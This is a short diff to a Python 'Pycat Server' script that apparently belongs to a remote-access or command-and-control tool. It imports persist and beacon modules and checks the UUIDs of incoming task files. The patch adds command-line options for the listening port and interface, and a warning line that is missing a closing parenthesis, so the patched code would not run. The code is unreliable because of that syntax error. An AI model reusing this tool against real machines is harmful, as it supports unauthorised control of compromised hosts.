@@ -1,5 +1,6 @@
 #!/usr/bin/python3
 import socket, ssl, persist, beacon
+import argparse
 from socket import AF_INET, SOCK_STREAM, SO_REUSEADDR, SOL_SOCKET, SHUT_RDWR
 from printlib import *
 from os import path, remove, kill, getpid, listdir
@@ -274,6 +275,7 @@ def listen():
                     conn.close()
                 else:
                     print_warn("UUID check failed.  Skipping Task File")
+                    print_warn("Presented UUID: {}".format(uuid)
                     conn.shutdown(socket.SHUT_RDWR)
                     conn.close()
             while True:
@@ -410,6 +412,16 @@ def listen():
             print_warn("Lost Connection")
 
 def main ():
+    global listen_port
+    global listen_addr
+    parser = argparse.ArgumentParser(description="Pycat Server")
+    parser.add_argument('-p', action='store', dest='port',
+                            help='Listening Port',default=listen_port)
+    parser.add_argument('-i', action='store', dest='interface',
+                            help='Listening IP',default=listen_addr)
+    args = parser.parse_args()
+    listen_addr = args.interface
+    listen_port = args.port
     try:
         create_keys()
         listen()
